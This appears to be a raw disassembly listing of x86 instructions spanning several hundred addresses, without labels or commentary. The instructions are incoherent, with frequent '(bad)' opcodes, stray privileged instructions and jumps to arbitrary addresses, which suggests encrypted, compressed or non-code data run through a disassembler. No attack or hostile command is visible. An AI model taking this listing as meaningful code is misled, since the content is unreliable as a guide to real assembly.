  41fb32:	ins    BYTE PTR es:[edi],dx
  41fb33:	mov    ah,0xd7
  41fb35:	std    
  41fb36:	fcmovbe st,st(5)
  41fb38:	repnz inc esi
  41fb3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb3b:	mov    ch,0x1b
  41fb3d:	cmp    al,0x3a
  41fb3f:	and    ebx,DWORD PTR [ecx]
  41fb41:	ret    
  41fb42:	push   esp
  41fb43:	imul   ebx,DWORD PTR [edi+edi*2+0xf],0xe921dbec
  41fb4b:	jl     0x41fadd
  41fb4d:	cmp    BYTE PTR [esi],0xd8
  41fb50:	cdq    
  41fb51:	mov    bh,0x9d
  41fb53:	add    BYTE PTR [edx],ch
  41fb55:	cmp    eax,0xfbd23f6c
  41fb5a:	mov    eax,0x660b4c26
  41fb5f:	aas    
  41fb60:	xacquire xchg BYTE PTR [eax+0x57],dl
  41fb64:	jae    0x41fb35
  41fb66:	xor    DWORD PTR [esi-0x4f3c0241],0xffffffa4
  41fb6d:	mov    bl,0x2
  41fb6f:	add    edx,edi
  41fb71:	xchg   esp,eax
  41fb72:	fwait
  41fb73:	jecxz  0x41fb6a
  41fb75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb76:	push   ss
  41fb77:	mov    cl,0x1f
  41fb79:	into   
  41fb7a:	aad    0x86
  41fb7c:	test   eax,0x93b8d332
  41fb81:	xchg   esi,eax
  41fb82:	fwait
  41fb83:	test   al,0xd
  41fb85:	int    0x82
  41fb87:	into   
  41fb88:	fisub  WORD PTR [esi-0x559dd647]
  41fb8e:	adc    DWORD PTR [esp+esi*4],eax
  41fb91:	aas    
  41fb92:	adc    DWORD PTR [esi],ebx
  41fb94:	test   BYTE PTR [edx+0x13],ch
  41fb97:	pop    esi
  41fb98:	jecxz  0x41fbd9
  41fb9a:	or     BYTE PTR [eax],0xc
  41fb9d:	(bad)  
  41fb9e:	frstor [edi-0x4bd35903]
  41fba4:	or     BYTE PTR ds:0xc492a8a6,ah
  41fbaa:	test   DWORD PTR [edx+0x6d951de6],ebp
  41fbb0:	(bad)  
  41fbb1:	mov    dh,0x57
  41fbb3:	sbb    al,0xd7
  41fbb5:	push   es
  41fbb6:	hlt    
  41fbb7:	lahf   
  41fbb8:	xchg   ecx,eax
  41fbb9:	retf   0x7d6b
  41fbbc:	or     eax,0xffb14428
  41fbc1:	pop    ds
  41fbc2:	jl     0x41fc2f
  41fbc4:	and    eax,0x7f50d0dc
  41fbc9:	add    DWORD PTR [ecx],ecx
  41fbcb:	xor    eax,0x5923648a
  41fbd0:	out    0x32,eax
  41fbd2:	jmp    0x357de7ad
  41fbd7:	inc    ebp
  41fbd8:	adc    al,0x94
  41fbda:	scas   eax,DWORD PTR es:[edi]
  41fbdb:	sti    
  41fbdc:	loopne 0x41fc28
  41fbde:	stc    
  41fbdf:	sahf   
  41fbe0:	add    eax,0x6a48e226
  41fbe5:	jecxz  0x41fc38
  41fbe7:	repnz mov esp,DWORD PTR [ecx]
  41fbea:	ret    0x9483
  41fbed:	(bad)  
  41fbee:	xrelease mov DWORD PTR [edi+0x464495d1],ebp
  41fbf5:	aad    0x5b
  41fbf7:	jp     0x41fb79
  41fbf9:	mov    dh,0x8b
  41fbfb:	add    dl,bh
  41fbfd:	loop   0x41fc60
  41fbff:	mov    eax,0x58fdcc8a
  41fc04:	(bad)  
  41fc05:	push   ss
  41fc06:	cdq    
  41fc07:	sub    al,0xe1
  41fc09:	xchg   edi,eax
  41fc0a:	inc    edi
  41fc0b:	in     eax,0x2f
  41fc0d:	xchg   ebp,eax
  41fc0e:	(bad)  
  41fc0f:	sti    
  41fc10:	(bad)  
  41fc11:	out    dx,al
  41fc12:	xchg   ebp,edi
  41fc14:	dec    ebp
  41fc15:	ins    DWORD PTR es:[edi],dx
  41fc16:	inc    ebp
  41fc17:	pop    ds
  41fc18:	jmp    0x41fc6d
  41fc1a:	loope  0x41fbda
  41fc1c:	jae    0x41fc49
  41fc1e:	fnclex 
  41fc20:	mov    ds:0x77ed9a05,al
  41fc25:	jne    0x41fc22
  41fc27:	gs jge 0x41fc66
  41fc2a:	test   ebx,esp
  41fc2c:	add    bl,dl
  41fc2e:	and    ebx,DWORD PTR [edi]
  41fc30:	dec    eax
  41fc31:	sbb    BYTE PTR [edi],dl
  41fc33:	minps  xmm2,xmm1
  41fc36:	sub    eax,ebp
  41fc38:	imul   eax,edi,0x3a
  41fc3b:	push   0xffffffc9
  41fc3d:	xchg   BYTE PTR [ecx-0x5aaa8787],bh
  41fc43:	rcl    al,0xc0
  41fc46:	(bad)  [esi+0x2ee06664]
  41fc4c:	cmp    DWORD PTR [ecx+esi*4-0x77],ebx
  41fc50:	jo     0x41fc04
  41fc52:	xlat   BYTE PTR ds:[ebx]
  41fc53:	mov    esi,0x81b47ff7
  41fc58:	pop    ecx
  41fc59:	mov    ebx,0xdfb2f997
  41fc5e:	cdq    
  41fc5f:	stos   BYTE PTR es:[edi],al
  41fc60:	inc    edi
  41fc61:	jmp    0x41fcac
  41fc63:	fwait
  41fc64:	jp     0x41fcaa
  41fc66:	lahf   
  41fc67:	pop    eax
  41fc68:	ficomp DWORD PTR [ebp-0xa]
  41fc6b:	add    BYTE PTR [eax-0x383097b4],bh
  41fc71:	call   0xf792f562
  41fc76:	les    ecx,FWORD PTR [eax+eiz*1-0x2e]
  41fc7a:	xchg   BYTE PTR [ebx],bh
  41fc7c:	pop    es
  41fc7d:	add    BYTE PTR ds:0xeb8baeb6,dh
  41fc83:	and    al,0x44
  41fc85:	popa   
  41fc86:	cli    
  41fc87:	repz frstor [ebx-0x125ac7aa]
  41fc8e:	aam    0xdf
  41fc90:	mov    cl,0x4
  41fc93:	xchg   ecx,eax
  41fc94:	ds daa 
  41fc96:	add    al,0x7f
  41fc98:	pop    ecx
  41fc99:	nop
  41fc9a:	jbe    0x41fc9b
  41fc9c:	mov    eax,?
  41fc9e:	mov    ah,0x86
  41fca0:	sti    
  41fca1:	lahf   
  41fca2:	int    0x81
  41fca4:	jg     0x41fc52
  41fca6:	cwde   
  41fca7:	(bad)  
  41fca8:	jae    0x41fcb4
  41fcaa:	pushf  
  41fcab:	push   ebx
  41fcac:	fld    DWORD PTR [edx-0xbbacc41]
  41fcb2:	(bad)  
  41fcb3:	ins    BYTE PTR es:[edi],dx
  41fcb4:	shr    esi,0xff
  41fcb7:	test   eax,0x8a96a146
  41fcbc:	cmp    DWORD PTR [edi-0x4de35e59],eax
  41fcc2:	xchg   dl,dh
  41fcc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcc5:	and    esp,DWORD PTR [esi]
  41fcc7:	sbb    eax,0xcac6b9f1
  41fccc:	mov    bl,0x6e
  41fcce:	loope  0x41fc8b
  41fcd0:	test   DWORD PTR [eax+0xe],0x99b6e4c3
  41fcd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcd8:	lods   eax,DWORD PTR ds:[esi]
  41fcd9:	inc    eax
  41fcda:	push   cs
  41fcdb:	pusha  
  41fcdc:	in     eax,dx
  41fcdd:	pop    eax
  41fcde:	inc    esp
  41fcdf:	sub    BYTE PTR [esi],0x48
  41fce2:	inc    DWORD PTR [esp+esi*1-0x4b]
  41fce6:	(bad)  
  41fce7:	jmp    0x7db3:0xf9639214
  41fcee:	jmp    0xc4325699
  41fcf3:	inc    edx
  41fcf4:	int3   
  41fcf5:	data16 xor al,0x18
  41fcf8:	mov    ah,0xa4
  41fcfa:	or     eax,0x4df3e166
  41fcff:	fild   DWORD PTR [ebx]
  41fd01:	add    DWORD PTR [esp+edi*4],edx
  41fd04:	shr    dh,0xa2
  41fd07:	hlt    
  41fd08:	push   edx
  41fd09:	inc    ebp
  41fd0a:	aad    0xe1
  41fd0c:	das    
  41fd0d:	push   cs
  41fd0e:	inc    ecx
  41fd0f:	jbe    0x41fce1
  41fd11:	pop    ebp
  41fd12:	dec    esi
  41fd13:	xchg   esi,eax
  41fd14:	inc    esp
  41fd15:	add    DWORD PTR [eax-0x7dc676b9],ebp
  41fd1b:	hlt    
  41fd1c:	mov    esp,0x778631ad
  41fd21:	in     eax,0x7a
  41fd23:	jno    0x41fd96
  41fd25:	mov    ds:0xfaa15d13,eax
  41fd2a:	inc    ebx
  41fd2b:	adc    esi,eax
  41fd2d:	xchg   esi,eax
  41fd2e:	aam    0x2c
  41fd30:	and    edx,eax
  41fd32:	mov    ch,0x17
  41fd34:	mov    edx,0x34a513d8
  41fd39:	mov    al,ds:0x1a840a5e
  41fd3e:	inc    ebx
  41fd3f:	lods   al,BYTE PTR ds:[esi]
  41fd40:	mov    edx,0x505ffb99
  41fd45:	lods   eax,DWORD PTR ds:[esi]
  41fd46:	shr    dl,1
  41fd48:	cmp    BYTE PTR [edx+eiz*2+0x3f8af0fa],dh
  41fd4f:	inc    ecx
  41fd50:	faddp  st(0),st
  41fd52:	and    edx,DWORD PTR [ebx]
  41fd54:	mov    DWORD PTR [esi-0x6e],eax
  41fd57:	xchg   ebp,eax
  41fd58:	fsubr  st(3),st
  41fd5a:	(bad)  
  41fd5b:	sbb    BYTE PTR fs:[esi+0x3d135f12],0x3c
  41fd63:	xor    al,0xc0
  41fd65:	mov    BYTE PTR [ebp-0x30390f13],al
  41fd6b:	push   ds
  41fd6c:	push   ebx
  41fd6d:	mov    ss,WORD PTR ds:0x4b1e6793
  41fd73:	popa   
  41fd74:	push   esp
  41fd75:	mov    WORD PTR [esp+edx*8],gs
  41fd78:	cmp    edx,ebp
  41fd7a:	jmp    0x41fd5d
  41fd7c:	add    esp,DWORD PTR [ebx]
  41fd7e:	sub    cl,bl
  41fd80:	xor    BYTE PTR [ebx+0x79],0xd
  41fd84:	cld    
  41fd85:	cmp    eax,0xedc0d4d1
  41fd8a:	(bad)  
  41fd8b:	cli    
  41fd8c:	pushf  
  41fd8d:	jl     0x41fdc4
  41fd8f:	or     eax,0x683190be
  41fd94:	sar    DWORD PTR [edx],1
  41fd96:	les    esi,FWORD PTR [ecx-0x185b6c7e]
  41fd9c:	mov    ah,0xf6
  41fd9e:	mov    ebx,0x3142bceb
  41fda3:	sbb    DWORD PTR [ebp+0xd],ebp
  41fda6:	dec    eax
  41fda7:	(bad)  
  41fda8:	test   ah,0x57
  41fdab:	xchg   DWORD PTR [edi+0x2493af1f],eax
  41fdb1:	jge    0x41fd8e
  41fdb3:	push   0xffffffe8
  41fdb5:	sbb    BYTE PTR [edi+0x64],ch
  41fdb8:	push   eax
  41fdb9:	ss pop ebx
  41fdbb:	mov    ch,0x4
  41fdbd:	mov    eax,0xd1d30ad7
  41fdc2:	stos   DWORD PTR es:[edi],eax
  41fdc3:	xchg   esp,eax
  41fdc4:	or     cl,BYTE PTR [edi-0x522828bc]
  41fdca:	loopne 0x41fdcb
  41fdcc:	xor    edx,edx
  41fdce:	adc    BYTE PTR [edi],dh
  41fdd0:	cdq    
  41fdd1:	cwde   
  41fdd2:	mov    ch,0xb3
  41fdd4:	or     ebp,DWORD PTR ds:[bp+si+0x6a]
  41fdd9:	ret    0x5bbf
  41fddc:	sub    eax,0xfa694f76
  41fde1:	inc    ecx
  41fde2:	push   esi
  41fde3:	push   0x4e
  41fde5:	sbb    eax,esp
  41fde7:	aaa    
  41fde8:	mov    bl,ch
  41fdea:	xchg   edi,eax
  41fdeb:	and    dl,BYTE PTR [eax+0x68]
  41fdee:	push   ebx
  41fdef:	leave  
  41fdf0:	xchg   DWORD PTR [ebp+0x71],edx
  41fdf3:	cdq    
  41fdf4:	xchg   edx,eax
  41fdf5:	ins    BYTE PTR es:[edi],dx
  41fdf6:	fistp  WORD PTR ds:0xa5e1b2e2
  41fdfc:	in     eax,dx
  41fdfd:	mov    eax,0xf0a43983
  41fe02:	jle    0x41fe09
  41fe04:	add    DWORD PTR [eax-0x1b],ecx
  41fe07:	je     0x41fe24
  41fe09:	leave  
  41fe0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe0b:	iret   
  41fe0c:	ss add al,0xd5
  41fe0f:	nop
  41fe10:	jne    0x41fe31
  41fe12:	mov    ah,0xf3
  41fe14:	repnz push ebp
  41fe16:	mov    ch,0xb3
  41fe18:	mov    dh,0x7e
  41fe1a:	xor    DWORD PTR [ebx],0x95c4e576
  41fe20:	loope  0x41fe31
  41fe22:	bound  eax,QWORD PTR [ecx]
  41fe24:	sub    dh,cl
  41fe26:	sub    DWORD PTR cs:[ebp+0x66],esi
  41fe2a:	mov    WORD PTR [edi-0x27],ds
  41fe2d:	adc    DWORD PTR [ebx+esi*1-0x32],eax
  41fe31:	inc    edx
  41fe32:	imul   edi,ebx,0x51
  41fe35:	in     eax,0x32
  41fe37:	jmp    0x41fea5
  41fe39:	scas   al,BYTE PTR es:[edi]
  41fe3a:	aas    
  41fe3b:	pop    DWORD PTR [ecx]
  41fe3d:	loope  0x41fe99
  41fe3f:	inc    esp
  41fe40:	pop    edx
  41fe41:	pusha  
  41fe42:	and    eax,0x8c8bcd97
  41fe47:	pusha  
  41fe48:	addr16 jle 0x41fec5
  41fe4b:	int3   
  41fe4c:	add    eax,0x533247b6
  41fe51:	cmc    
  41fe52:	sbb    BYTE PTR [edi-0x1b],bl
  41fe55:	sub    ah,BYTE PTR [ecx-0x1fc245d6]
  41fe5b:	cmp    al,0x44
  41fe5d:	imul   ecx,DWORD PTR [ebx],0x9076e261
  41fe63:	loope  0x41fe0a
  41fe65:	outs   dx,BYTE PTR ds:[esi]
  41fe66:	pop    ecx
  41fe67:	pop    ecx
  41fe68:	mov    edx,0x438880a1
  41fe6d:	int    0x75
  41fe6f:	and    dh,BYTE PTR [esi+esi*8-0x308c6555]
  41fe76:	imul   ebp,DWORD PTR [ecx-0x5e],0xffffff98
  41fe7a:	push   edi
  41fe7b:	mov    ecx,0xb6bba3df
  41fe80:	xlat   BYTE PTR ds:[ebx]
  41fe81:	mov    dh,0xc8
  41fe83:	dec    edx
  41fe84:	mov    es,edi
  41fe86:	(bad)  
  41fe87:	in     eax,dx
  41fe88:	or     eax,0xdae5834
  41fe8d:	pop    edi
  41fe8e:	pop    ecx
  41fe8f:	mov    ds:0xb2492ee8,eax
  41fe94:	jnp    0x41fe2b
  41fe96:	shr    BYTE PTR [ebx-0x4802de30],0x33
  41fe9d:	push   esp
  41fe9e:	dec    ebx
  41fe9f:	(bad)  
  41fea0:	nop
  41fea1:	je     0x41ff13
  41fea3:	dec    edi
  41fea4:	gs and al,0xc7
  41fea7:	push   ecx
  41fea8:	in     eax,dx
  41fea9:	cmp    ah,BYTE PTR [edx-0x29c3d7e8]
  41feaf:	hlt    
  41feb0:	int3   
  41feb1:	stos   BYTE PTR es:[edi],al
  41feb2:	bswap  esi
  41feb4:	push   es
  41feb5:	dec    edi
  41feb6:	pushf  
  41feb7:	int    0x83
  41feb9:	cmp    eax,0x59df26aa
  41febe:	arpl   WORD PTR [eax],dx
  41fec0:	dec    edx
  41fec1:	mov    edi,0xe9d72c53
  41fec6:	repnz imul esi,DWORD PTR es:[ecx-0x14],0x75
  41fecc:	pop    esi
  41fecd:	(bad)  
  41fece:	popf   
  41fecf:	mov    ch,0xe8
  41fed1:	push   esi
  41fed2:	mov    BYTE PTR [eax-0x1d],0xf6
  41fed6:	mov    eax,ds:0x24f3737f
  41fedb:	ror    DWORD PTR [eax-0x17e30ace],0x4b
  41fee2:	call   0x8d7c7eec
  41fee7:	outs   dx,DWORD PTR ds:[esi]
  41fee8:	push   cs
  41fee9:	gs jo  0x41ff15
  41feec:	fistp  WORD PTR [ecx+0x2fb7208a]
  41fef2:	or     dh,BYTE PTR [ebp-0x1d]
  41fef5:	adc    DWORD PTR [ebx],eax
  41fef7:	(bad)  
  41fef8:	jle    0x41fef0
  41fefa:	cmp    DWORD PTR [eax],ebp
  41fefc:	shl    dl,1
  41fefe:	inc    edx
  41feff:	fsubr  QWORD PTR [edi]
  41ff01:	mov    ch,0x21
  41ff03:	and    eax,0xe7280c90
  41ff08:	in     eax,0x97
  41ff0a:	js     0x41fef4
  41ff0c:	pop    ecx
  41ff0d:	out    0xd4,al
  41ff0f:	fcmovu st,st(5)
  41ff11:	mov    ch,0xc4
  41ff13:	sub    al,0xa9
  41ff15:	xchg   ebx,eax
  41ff16:	pop    ss
  41ff17:	sbb    eax,0x63c33a6c
  41ff1c:	mov    bl,0xb1
  41ff1e:	xor    ebp,edx
  41ff20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff21:	test   eax,0x6026fd
  41ff26:	icebp  
  41ff27:	shr    BYTE PTR [edx],cl
  41ff29:	and    BYTE PTR [ebx-0x3e],dh
  41ff2c:	jae    0x41fee9
  41ff2e:	or     esi,DWORD PTR [edx]
  41ff30:	aas    
  41ff31:	fst    st(1)
  41ff33:	add    ecx,DWORD PTR [esi-0x41]
  41ff36:	dec    ebp
  41ff37:	mov    bl,BYTE PTR [esi+0x45]
  41ff3a:	ins    BYTE PTR es:[edi],dx
  41ff3b:	mov    esp,0x90758a19
  41ff40:	fldenv fs:[eax-0x42]
  41ff44:	(bad)  
  41ff46:	xchg   esp,eax
  41ff47:	inc    edx
  41ff48:	repz mov bh,0x9d
  41ff4b:	pop    es
  41ff4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff4d:	fisub  DWORD PTR [eax]
  41ff4f:	xor    bl,BYTE PTR [ebx-0x52]
  41ff52:	lods   al,BYTE PTR ds:[esi]
  41ff53:	pop    ecx
  41ff54:	(bad)  
  41ff55:	enter  0xe3df,0x82
  41ff59:	inc    edx
  41ff5a:	fild   DWORD PTR [ebx-0x37]
  41ff5d:	js     0x41ff72
  41ff5f:	(bad)  [ebx-0x3dd0bdf8]
  41ff65:	hlt    
  41ff66:	xor    eax,0x328a9ceb
  41ff6b:	adc    dh,BYTE PTR [eax-0x47]
  41ff6e:	inc    edx
  41ff6f:	cmp    eax,DWORD PTR [edi]
  41ff71:	jo     0x41ff4c
  41ff73:	leave  
  41ff74:	inc    esp
  41ff75:	ret    
  41ff76:	sub    DWORD PTR [edi-0x5a725fe9],ebp
  41ff7c:	mov    ebp,edi
  41ff7e:	loop   0x41ffd6
  41ff80:	je     0x41ff95
  41ff82:	ss jbe 0x41ff45
  41ff85:	dec    ebp
  41ff86:	xchg   esp,eax
  41ff87:	adc    eax,0xa4e59e37
  41ff8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff8d:	pop    esi
  41ff8e:	lods   al,BYTE PTR ds:[esi]
  41ff8f:	mov    bl,0xa8
  41ff91:	and    al,0xb2
  41ff93:	adc    DWORD PTR [ecx-0x60],edi
  41ff96:	adc    bh,al
  41ff98:	or     BYTE PTR [esi],bl
  41ff9a:	add    eax,0x6b39c13
  41ff9f:	(bad)  
  41ffa0:	or     al,0xb8
  41ffa2:	pop    esp
  41ffa3:	inc    ebp
  41ffa4:	vunpcklps ymm7,ymm3,YMMWORD PTR [edx+ebx*4+0x8e6a8ea]
  41ffad:	xchg   DWORD PTR [esi],eax
  41ffaf:	js     0x41ff6a
  41ffb1:	adc    ebp,DWORD PTR [esi]
  41ffb3:	inc    eax
  41ffb4:	sub    esi,DWORD PTR ds:0x7374aaf8
  41ffba:	add    ecx,DWORD PTR [edi+0x5cc84991]
  41ffc0:	xchg   edx,eax
  41ffc1:	or     eax,0x7aa2398e
  41ffc6:	es push edi
  41ffc8:	push   ecx
  41ffc9:	aad    0x41
  41ffcb:	push   ds
  41ffcc:	push   ss
  41ffcd:	pop    ebp
  41ffce:	sti    
  41ffcf:	dec    esi
  41ffd0:	sub    edx,ebx
  41ffd2:	popf   
  41ffd3:	hlt    
  41ffd4:	or     DWORD PTR [ecx],esp
  41ffd6:	jmp    0x41ffd7
  41ffd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffd9:	and    al,0x56
  41ffdb:	inc    esi
  41ffdc:	push   edi
  41ffdd:	push   es
  41ffde:	sbb    al,0x85
  41ffe0:	(bad)  
  41ffe1:	daa    
  41ffe2:	test   BYTE PTR [ebp+0x5a],ch
  41ffe5:	jecxz  0x420028
  41ffe7:	es jl  0x42005d
  41ffea:	push   esp
  41ffeb:	imul   edx,DWORD PTR [ebx],0x1e
  41ffee:	mov    esi,ebp
  41fff0:	jae    0x420020
  41fff2:	pop    edi
  41fff3:	loop   0x420059
  41fff5:	clc    
  41fff6:	ficom  WORD PTR [ecx+0x27536b51]
  41fffc:	inc    ebp
  41fffd:	ror    BYTE PTR [esi],0x24
  420000:	sub    al,0xb7
  420002:	inc    edx
  420003:	sbb    DWORD PTR [esi-0x2f],esi
  420006:	daa    
  420007:	inc    esp
  420008:	es scas al,BYTE PTR es:[edi]
  42000a:	pop    es
  42000b:	adc    esi,0xffffffbe
  42000e:	sub    ebx,DWORD PTR [ecx-0x63a5522f]
  420014:	mov    eax,0x6bc2927
  420019:	xchg   DWORD PTR [edi-0x75],eax
  42001c:	jg     0x41ffc3
  42001e:	cmc    
  42001f:	test   eax,0xb0eaac65
  420024:	int    0xc2
  420026:	and    dl,al
  420028:	jae    0x420091
  42002a:	(bad)  [ebx-0x29]
  42002d:	retf   
  42002e:	jno    0x41ffb5
  420030:	(bad)  
  420032:	xor    bh,BYTE PTR [esi]
  420034:	scas   al,BYTE PTR es:[edi]
  420035:	mov    dh,0xf3
  420037:	mov    BYTE PTR [ebx+0x7e89f0ba],dh
  42003d:	in     eax,dx
  42003e:	fwait
  42003f:	jl     0x42000b
  420041:	nop
  420042:	inc    eax
  420043:	lds    esp,FWORD PTR [ebp+0x48e6bb03]
  420049:	aam    0x54
  42004b:	retf   
  42004c:	and    BYTE PTR [edi+0x1b],bl
  42004f:	dec    ebp
  420050:	mov    ecx,0x15671fb3
  420055:	ins    BYTE PTR es:[edi],dx
  420056:	cmc    
  420057:	lahf   
  420058:	loopne 0x4200d1
  42005a:	push   ds
  42005b:	xor    al,0xab
  42005d:	push   0x3b7a184a
  420062:	inc    ebx
  420063:	dec    esi
  420064:	mov    ah,0x47
  420066:	aad    0x68
  420068:	adc    dh,BYTE PTR [edi+0x1b]
  42006b:	and    eax,0xa4681f2d
  420070:	out    dx,al
  420071:	inc    esi
  420072:	test   DWORD PTR [ecx-0x24],0xec09d1de
  420079:	mov    edx,0x77bcccd6
  42007e:	cmp    BYTE PTR [eax+0x32],cl
  420081:	mov    ecx,0xd69ef30f
  420086:	jns    0x420009
  420088:	repz dec ecx
  42008a:	mov    eax,0x7f2b2319
  42008f:	add    esp,DWORD PTR [edi]
  420091:	fwait
  420092:	in     eax,0x11
  420094:	fisubr WORD PTR ds:0x766e26a
  42009a:	inc    ebx
  42009b:	xchg   edx,eax
  42009c:	fstp   DWORD PTR [ecx+0x74351b4e]
  4200a2:	pop    edi
  4200a3:	ja     0x42007c
  4200a5:	(bad)  
  4200a6:	xchg   ebx,eax
  4200a7:	fs jnp 0x420126
  4200aa:	ins    BYTE PTR es:[edi],dx
  4200ab:	(bad)  [edi]
  4200ad:	sbb    ebx,DWORD PTR [ebx-0x33]
  4200b0:	or     eax,0x874287ac
  4200b5:	jbe    0x42010f
  4200b7:	jmp    0x66df:0x9c4c7b04
  4200be:	scas   eax,DWORD PTR es:[edi]
  4200bf:	enter  0x5776,0x38
  4200c3:	aas    
  4200c4:	mov    al,ds:0x8b4f31d7
  4200c9:	(bad)  
  4200ca:	(bad)  
  4200cb:	jo     0x420064
  4200cd:	cmp    dh,dh
  4200cf:	sbb    BYTE PTR [ebx+ebp*1-0x5],bl
  4200d3:	sub    esi,eax
  4200d5:	arpl   si,bx
  4200d7:	mov    al,0x4
  4200d9:	push   eax
  4200da:	(bad)  
  4200db:	fcmovnbe st,st(5)
  4200dd:	add    al,0x67
  4200df:	stos   BYTE PTR es:[edi],al
  4200e0:	jecxz  0x4200ab
  4200e2:	ret    0xf1e8
  4200e5:	and    eax,0xb83fa2dc
  4200ea:	sahf   
  4200eb:	mov    ds:0x8838b5a7,al
  4200f0:	in     al,dx
  4200f1:	cs push ss
  4200f3:	mov    ds,WORD PTR [edx+0x6ab489b3]
  4200f9:	inc    ecx
  4200fa:	mov    ah,ch
  4200fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200fd:	push   cs
  4200fe:	add    eax,edi
  420100:	mov    esp,0x621b9c25
  420105:	test   DWORD PTR [ebx+0x14],0x947fe7ed
  42010c:	mov    al,ds:0x61b5be6a
  420111:	add    bl,0xdd
  420114:	jmp    0xf2ac:0xfbacc056
  42011b:	fisttp QWORD PTR [ebp+0x25]
  42011e:	xlat   BYTE PTR ds:[ebx]
  42011f:	jecxz  0x4200ce
  420121:	sub    DWORD PTR [edi-0x4f96b72f],esp
  420127:	and    eax,DWORD PTR [esi]
  420129:	and    ebp,DWORD PTR [edx+0xc]
  42012c:	sbb    al,0xaa
  42012e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42012f:	xchg   edi,eax
  420130:	jp     0x420161
  420132:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420133:	std    
  420134:	pop    edi
  420135:	mov    al,BYTE PTR [edi+0x5fa8ecbb]
  42013b:	mov    edx,0x1fb71f6b
  420140:	mov    edi,DWORD PTR ds:0x24976a3b
  420146:	(bad)  
  420147:	push   0x35430f40
  42014c:	add    DWORD PTR [edx-0x42],edi
  42014f:	xor    DWORD PTR [esi+ebx*2],0x11
  420153:	mov    esp,0xc13f656a
  420158:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420159:	cdq    
  42015a:	mov    esi,0x73fdbe08
  42015f:	jmp    0x564e:0x7c6c7c3d
  420166:	aas    
  420167:	dec    esp
  420168:	add    eax,0x3a01cd0c
  42016d:	pop    edi
  42016e:	or     ebx,esi
  420170:	adc    eax,0xa6af83f0
  420175:	pop    ecx
  420176:	mov    ebp,0xb15bbcb4
  42017b:	sar    DWORD PTR [esi],0xdd
  42017e:	mov    cs,WORD PTR [edx+0x71f4916b]
  420184:	push   esp
  420185:	or     bl,BYTE PTR [ebp+0x6a]
  420188:	mov    esp,0x52b883a6
  42018d:	sub    esp,ebp
  42018f:	add    al,0x18
  420191:	or     esp,eax
  420193:	xchg   ebx,eax
  420194:	push   0xfad204b8
  420199:	arpl   WORD PTR [esi+eax*8+0x1a5a448f],bp
  4201a0:	push   0x4c
  4201a2:	xor    BYTE PTR [ecx+0x2bb6111f],dl
  4201a8:	or     al,0x89
  4201aa:	sub    ebp,DWORD PTR [edx+0xf5b4212]
  4201b0:	pop    es
  4201b1:	sub    DWORD PTR [ebx],ebp
  4201b3:	clc    
  4201b4:	mov    dh,0xc9
  4201b6:	xchg   ebp,eax
  4201b7:	pop    esp
  4201b8:	sti    
  4201b9:	sbb    edx,ecx
  4201bb:	ffreep st(0)
  4201bd:	jae    0x420213
  4201bf:	pop    es
  4201c0:	fcmove st,st(7)
  4201c2:	and    eax,0x872c2022
  4201c7:	bound  ebx,QWORD PTR [esi]
  4201c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201ca:	sub    BYTE PTR ds:0x51fa7497,0xc7
  4201d1:	adc    BYTE PTR [edx-0x35],ch
  4201d4:	and    BYTE PTR [edx],dl
  4201d6:	shl    BYTE PTR [edx+esi*8],cl
  4201d9:	xchg   BYTE PTR [bp+di],ch
  4201dc:	sub    DWORD PTR [edi],edi
  4201de:	sahf   
  4201df:	popf   
  4201e0:	pop    esp
  4201e1:	rol    BYTE PTR [esi],0x2f
  4201e4:	icebp  
  4201e5:	adc    edi,DWORD PTR [eax+0x5f]
  4201e8:	loop   0x420195
  4201ea:	or     DWORD PTR [eiz*8+0x2cee86a3],ebx
  4201f1:	jo     0x4201e9
  4201f3:	icebp  
  4201f4:	jns    0x4201a4
  4201f6:	mov    cs,WORD PTR [ecx-0x5831d76b]
  4201fc:	cld    
  4201fd:	or     BYTE PTR [eax+0x30],ch
  420200:	dec    edx
  420201:	pop    esi
  420202:	xchg   BYTE PTR [esi],bl
  420204:	(bad)  
  420205:	jnp    0x4201d3
  420207:	inc    edi
  420208:	jl     0x42021d
  42020a:	leave  
  42020b:	fmul   QWORD PTR [ebp+0x1c]
  42020e:	neg    BYTE PTR [edi-0x44]
  420211:	jnp    0x4201a3
  420213:	pop    es
  420214:	mov    ecx,0x52334dcc
  420219:	push   0x727d9a
  42021e:	enter  0x1cec,0xb4
  420222:	retf   0x16e1
  420225:	jns    0x4201e3
  420227:	lods   eax,DWORD PTR ds:[esi]
  420228:	mov    dl,0x67
  42022a:	ds gs (bad) 
  42022d:	and    al,0xdd
  42022f:	rcr    BYTE PTR [eax],cl
  420231:	mov    ecx,0xa1ee2d70
  420236:	sub    ebp,DWORD PTR [ebp-0x1288bbe6]
  42023c:	add    dh,BYTE PTR [eax]
  42023e:	cs dec edx
  420240:	cmp    eax,0x72691960
  420245:	push   ebp
  420246:	test   al,0x9f
  420249:	inc    edx
  42024a:	dec    esi
  42024b:	scas   al,BYTE PTR es:[edi]
  42024c:	sub    BYTE PTR [ebx+eiz*8],dh
  42024f:	test   al,0x90
  420251:	into   
  420252:	gs into 
  420254:	mov    dl,0xec
  420256:	call   0x67c0e56c
  42025b:	xor    ebx,esi
  42025d:	mov    edi,0xc54c8c14
  420262:	mov    esp,0x4b5a4547
  420267:	out    dx,eax
  420268:	push   ds
  420269:	fsubr  DWORD PTR [eax-0x71be6f31]
  42026f:	scas   al,BYTE PTR es:[edi]
  420270:	scas   eax,DWORD PTR es:[edi]
  420271:	xchg   edi,eax
  420272:	or     BYTE PTR [ebp+ebp*1-0x50],ch
  420276:	cmp    al,cl
  420278:	or     DWORD PTR [edi+0x5],0xffffffc7
  42027c:	aad    0xa4
  42027e:	push   esp
  42027f:	push   esi
